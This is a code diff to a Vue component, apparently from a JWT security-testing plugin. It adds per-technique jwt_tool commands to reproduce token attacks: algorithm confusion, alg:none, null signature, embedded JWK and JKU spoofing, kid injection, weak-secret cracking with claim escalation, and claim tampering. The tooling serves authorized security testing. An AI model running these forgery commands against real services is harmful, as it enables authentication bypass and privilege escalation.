@@ -78,20 +78,14 @@
         <pre class="bg-gray-900 rounded p-2 text-xs text-gray-300 overflow-x-auto max-h-64 overflow-y-auto whitespace-pre-wrap break-all">{{ result.responseBody }}</pre>
       </section>
 
-      <!-- Reproduce with jwt_tool (algorithm confusion only) -->
-      <section v-if="jwtToolCommands" class="px-4 py-3">
+      <!-- Reproduce with jwt_tool -->
+      <section v-if="jwtTool" class="px-4 py-3">
         <p class="text-xs text-gray-500 uppercase tracking-wide mb-1">Reproduce with jwt_tool</p>
-        <p class="text-xs text-gray-500 mb-1.5">
-          Writes the exact HMAC secret ({{ result.secretEncoding }}) to a file, then forges the
-          same token. jwt_tool keeps the original header &amp; payload and only swaps <code>alg</code>.
-        </p>
-        <pre class="bg-gray-900 rounded p-2 text-xs text-cyan-300 overflow-x-auto max-h-48 overflow-y-auto select-all whitespace-pre-wrap break-all">{{ jwtToolCommands }}</pre>
+        <p v-if="jwtTool.note" class="text-xs text-gray-500 mb-1.5">{{ jwtTool.note }}</p>
+        <pre class="bg-gray-900 rounded p-2 text-xs text-cyan-300 overflow-x-auto max-h-48 overflow-y-auto select-all whitespace-pre-wrap break-all">{{ jwtTool.cmd }}</pre>
         <button @click="copyCmds" class="mt-1.5 text-xs text-gray-500 hover:text-gray-300 transition-colors">
           {{ copiedCmds ? "✓ Copied" : "Copy commands" }}
         </button>
-        <p v-if="result.secretEncoding === 'DER'" class="text-xs text-orange-300 mt-1.5">
-          Note: the DER variant is raw binary; jwt_tool reads the key file as text and may fail on it.
-        </p>
       </section>
     </div>
   </div>
@@ -125,14 +119,119 @@ function secretBase64(pem: string, encoding: string): string {
   }
 }
 
-const jwtToolCommands = computed(() => {
+function decodeSeg(seg: string): Record<string, unknown> | null {
+  try {
+    return JSON.parse(b64urlDecode(seg)) as Record<string, unknown>;
+  } catch {
+    return null;
+  }
+}
+
+// Per-technique jwt_tool reproduction command(s). algConfusion is byte-exact;
+// the others reproduce the equivalent attack (noted where the match is not exact).
+const jwtTool = computed<{ cmd: string; note?: string } | null>(() => {
   const r = props.result;
-  if (!r || r.technique !== "algConfusion" || !r.keyPem || !r.originalJWT) return null;
-  const b64 = secretBase64(r.keyPem, r.secretEncoding ?? "PEM");
-  return (
-    `echo -n '${b64}' | base64 -d > /tmp/jwt_pubkey\n` +
-    `python3 jwt_tool.py '${r.originalJWT}' -X k -pk /tmp/jwt_pubkey`
-  );
+  if (!r || !r.originalJWT) return null;
+  const J = "python3 jwt_tool.py";
+  const orig = `'${r.originalJWT}'`;
+  const modHeader = decodeSeg(r.modifiedJWT.split(".")[0] ?? "") ?? {};
+
+  switch (r.technique) {
+    case "algConfusion": {
+      if (!r.keyPem) return null;
+      const b64 = secretBase64(r.keyPem, r.secretEncoding ?? "PEM");
+      return {
+        cmd:
+          `echo -n '${b64}' | base64 -d > /tmp/jwt_pubkey\n` +
+          `${J} ${orig} -X k -pk /tmp/jwt_pubkey`,
+        note:
+          `Byte-exact. Writes the precise HMAC secret (${r.secretEncoding}) to a file, then forges the same token.` +
+          (r.secretEncoding === "DER"
+            ? " Note: DER is raw binary; jwt_tool reads the key file as text and may fail on it."
+            : ""),
+      };
+    }
+    case "none":
+      return {
+        cmd: `${J} ${orig} -X a`,
+        note: "Emits the alg:none variants (none/None/NONE/nOnE) with the signature stripped — pick the casing matching this row.",
+      };
+    case "nullSig":
+      return {
+        cmd: `${J} ${orig} -X n`,
+        note: "Produces the null-signature token (CVE-2020-28042).",
+      };
+    case "embeddedJwk":
+      return {
+        cmd: `${J} ${orig} -X i`,
+        note: "CVE-2018-0114. jwt_tool generates its OWN embedded key, so the jwk and signature differ from this row, but the attack is equivalent.",
+      };
+    case "jkuSpoof": {
+      const jku = typeof modHeader.jku === "string" ? modHeader.jku : "<your-jwks-url>";
+      return {
+        cmd: `${J} ${orig} -X s -ju '${jku}'`,
+        note: "jwt_tool generates its own key and JWKS — host jwt_tool's JWKS at the -ju URL (not this plugin's). The resulting token differs but the attack is equivalent.",
+      };
+    }
+    case "x5uSpoof":
+      return {
+        cmd:
+          `# jwt_tool has no built-in x5u spoofing exploit.\n` +
+          `# Closest built-in attack is JKU spoofing:\n` +
+          `${J} ${orig} -X s -ju '<your-jwks-url>'`,
+        note: "x5u spoofing isn't directly supported by jwt_tool; the JKU spoof (-X s) is the nearest equivalent.",
+      };
+    case "kidInject": {
+      const kid = typeof modHeader.kid === "string" ? modHeader.kid : "";
+      const secret = r.hmacSecret ?? "";
+      return {
+        cmd: `${J} ${orig} -I -hc kid -hv '${kid}' -S hs256 -p '${secret}'`,
+        note: `Sets kid="${kid}" and signs HS256 with the secret this injection implies ("${secret}").`,
+      };
+    }
+    case "weakSecret": {
+      const secret = r.hmacSecret ?? "";
+      return {
+        cmd:
+          `# Crack the secret from a wordlist:\n` +
+          `${J} ${orig} -C -d <wordlist.txt>\n` +
+          `# Forge once cracked (secret = "${secret}"):\n` +
+          `${J} ${orig} -S hs256 -p '${secret}'`,
+        note: "Crack mode recovers the secret; the second command re-signs. Add -I -pc role -pv admin (etc.) to escalate claims.",
+      };
+    }
+    case "claimTamper": {
+      const origP = decodeSeg(r.originalJWT.split(".")[1] ?? "") ?? {};
+      const modP = decodeSeg(r.modifiedJWT.split(".")[1] ?? "") ?? {};
+      const pairs: string[] = [];
+      const removed: string[] = [];
+      for (const k of Object.keys(modP)) {
+        if (JSON.stringify(modP[k]) !== JSON.stringify(origP[k])) {
+          const v = typeof modP[k] === "string" ? (modP[k] as string) : JSON.stringify(modP[k]);
+          pairs.push(`-pc ${k} -pv '${v}'`);
+        }
+      }
+      for (const k of Object.keys(origP)) if (!(k in modP)) removed.push(k);
+
+      if (pairs.length) {
+        let cmd = `${J} ${orig} -I ${pairs.join(" ")}`;
+        if (removed.length) cmd += `\n# Then delete claims interactively: ${J} ${orig} -T   (remove: ${removed.join(", ")})`;
+        return {
+          cmd,
+          note: "Tampers claims while leaving the original (invalid) signature — surfaces servers that skip verification. Non-string values are injected as strings; adjust if needed.",
+        };
+      }
+      if (removed.length) {
+        return {
+          cmd: `${J} ${orig} -T   # interactively delete claims: ${removed.join(", ")}`,
+          note: "jwt_tool can't delete claims non-interactively; use -T (tamper) mode and remove the listed claims.",
+        };
+      }
+      return null;
+    }
+    default:
+      return null;
+  }
 });
 
 const jwtParts = computed(() => {
@@ -176,8 +275,8 @@ async function copyKey() {
 }
 
 async function copyCmds() {
-  if (!jwtToolCommands.value) return;
-  await navigator.clipboard.writeText(jwtToolCommands.value);
+  if (!jwtTool.value) return;
+  await navigator.clipboard.writeText(jwtTool.value.cmd);
   copiedCmds.value = true;
   setTimeout(() => { copiedCmds.value = false; }, 1500);
 }
